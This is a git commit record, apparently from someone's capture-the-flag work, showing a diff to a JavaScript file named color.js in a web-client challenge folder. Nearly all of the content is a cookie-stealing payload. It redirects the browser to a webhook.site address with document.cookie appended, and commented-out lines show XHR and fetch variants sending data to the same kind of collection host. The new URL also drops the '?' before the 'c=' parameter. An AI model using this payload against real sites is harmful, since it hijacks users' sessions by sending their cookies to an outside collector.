f6aadefcccf45ad8b544fc63ca2ad50f67e69af0
NicolasGERVAIS1 <43536214+NicolasGERVAIS1@users.noreply.github.com>
2025-08-04 19:31:13 +0200

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -7,7 +7,7 @@
 //xhr.open("GET", "https://webhook.site/ed28b5cc-045f-4048-b049-2880871dbaad", true);
 //xhr.withCredentials = true;
 
-window.location = "//2631659f7a0d.ngrok-free.app?c="+document.cookie;
+window.location = "https://webhook.site/e662ad4a-3f8d-43ae-ba48-621b44028afac="+document.cookie;
   
 //fetch("https://webhook.site/ed28b5cc-045f-4048-b049-2880871dbaad", {
 //  method: "POST",
